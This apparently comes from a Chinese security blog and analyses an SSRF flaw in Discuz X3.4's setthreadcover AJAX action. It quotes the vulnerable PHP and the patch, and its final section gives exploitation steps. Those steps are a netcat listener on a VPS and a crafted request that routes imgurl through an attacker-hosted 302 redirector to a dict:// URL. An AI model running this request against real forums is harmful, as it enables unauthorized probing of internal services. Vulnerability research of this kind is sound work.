---
title: DiscuzX3.4 SSRF
date: 2018-03-14 07:24:55
tags:
---
# Discuz X3.4 SSRF

很早之前分析的，现在发出来吧
disucz 的一个更新[https://gitee.com/ComsenzDiscuz/DiscuzX/commit/19fd20f7420397b88278ac1a0dae65fe50012506]

0x00 漏洞描述
在forum_ajax.php下有这样的话
```php
} elseif($_GET['action'] == 'setthreadcover') {
	$aid = intval($_GET['aid']);
	$imgurl = $_GET['imgurl'];
	require_once libfile('function/post');
	if($_G['forum'] && ($aid || $imgurl)) {
		if($imgurl) {
			$tid = intval($_GET['tid']);
			$pid = intval($_GET['pid']);
		} else {
			$threadimage = C::t('forum_attachment_n')->fetch('aid:'.$aid, $aid);
			$tid = $threadimage['tid'];
			$pid = $threadimage['pid'];
		}

		if($tid && $pid) {
			$thread =get_thread_by_tid($tid);
		} else {
			$thread = array();
		}
		if(empty($thread) || (!$_G['forum']['ismoderator'] && $_G['uid'] != $thread['authorid'])) {
			if($_GET['newthread']) {
				showmessage('set_cover_faild', '', array(), array('msgtype' => 3));
			} else {
				showmessage('set_cover_faild', '', array(), array('closetime' => 3));
			}
		}
		if(setthreadcover($pid, $tid, $aid, 0, $imgurl)) {
			if(empty($imgurl)) {
				C::t('forum_threadimage')->delete_by_tid($threadimage['tid']);
				C::t('forum_threadimage')->insert(array(
					'tid' => $threadimage['tid'],
					'attachment' => $threadimage['attachment'],
					'remote' => $threadimage['remote'],
				));
			}
```

其中setthreadcover()
```php
function setthreadcover($pid, $tid = 0, $aid = 0, $countimg = 0, $imgurl = '') {
	global $_G;
	$cover = 0;
	if(empty($_G['uid']) || !intval($_G['setting']['forumpicstyle']['thumbheight']) || !intval($_G['setting']['forumpicstyle']['thumbwidth'])) {
		return false;
	}

	if(($pid || $aid) && empty($countimg)) {
		if(empty($imgurl)) {
			if($aid) {
				$attachtable = 'aid:'.$aid;
				$attach = C::t('forum_attachment_n')->fetch('aid:'.$aid, $aid, array(1, -1));
			} else {
				$attachtable = 'pid:'.$pid;
				$attach = C::t('forum_attachment_n')->fetch_max_image('pid:'.$pid, 'pid', $pid);
			}
			if(!$attach) {
				return false;
			}
			if(empty($_G['forum']['ismoderator']) && $_G['uid'] != $attach['uid']) {
				return false;
			}
			$pid = empty($pid) ? $attach['pid'] : $pid;
			$tid = empty($tid) ? $attach['tid'] : $tid;
			$picsource = ($attach['remote'] ? $_G['setting']['ftp']['attachurl'] : $_G['setting']['attachurl']).'forum/'.$attach['attachment'];
		} else {
			$attachtable = 'pid:'.$pid;
			$picsource = $imgurl;
		}

		$basedir = !$_G['setting']['attachdir'] ? (DISCUZ_ROOT.'./data/attachment/') : $_G['setting']['attachdir'];
		$coverdir = 'threadcover/'.substr(md5($tid), 0, 2).'/'.substr(md5($tid), 2, 2).'/';
		dmkdir($basedir.'./forum/'.$coverdir);

		require_once libfile('class/image');
		$image = new image();
		// 这里存在ssrf
		if($image->Thumb($picsource, 'forum/'.$coverdir.$tid.'.jpg', $_G['setting']['forumpicstyle']['thumbwidth'], $_G['setting']['forumpicstyle']['thumbheight'], 2)) {
			$remote = '';
			if(getglobal('setting/ftp/on')) {
				if(ftpcmd('upload', 'forum/'.$coverdir.$tid.'.jpg')) {
					$remote = '-';
				}
			}
			$cover = C::t('forum_attachment_n')->count_image_by_id($attachtable, 'pid', $pid);
			if($imgurl && empty($cover)) {
				$cover = 1;
			}
			$cover = $remote.$cover;
		} else {
			return false;
		}
	}
	if($countimg) {
		if(empty($cover)) {
			$thread = C::t('forum_thread')->fetch($tid);
			$oldcover = $thread['cover'];

			$cover = C::t('forum_attachment_n')->count_image_by_id('tid:'.$tid, 'pid', $pid);
			if($cover) {
				$cover = $oldcover < 0 ? '-'.$cover : $cover;
			}
		}
	}
	if($cover) {
		C::t('forum_thread')->update($tid, array('cover' => $cover));
		return true;
	}
}

```
而通过这里的image类是可以ssrf的
而修复后很暴力直接将存在imgurl的返回true。走不到image类
而image类是可以进行请求的
这里存在的ssrf
注意这里需要
```php
if($tid && $pid) {
```
设置tid和pid不为0

0x01 利用方式
1. 注册一个账号
2. 用这个账号在随便一个地方发帖子
3. 在vps运行nc -lvvp 2333
4. 访问
```url
/forum.php?mod=ajax&action=setthreadcover&tid=408&pid=1&imgurl=http://1.1.1.1/302.php%3furl%3ddict%253a%252f%252f1.1.1.1%253a2333%252fT1m0n233233
```
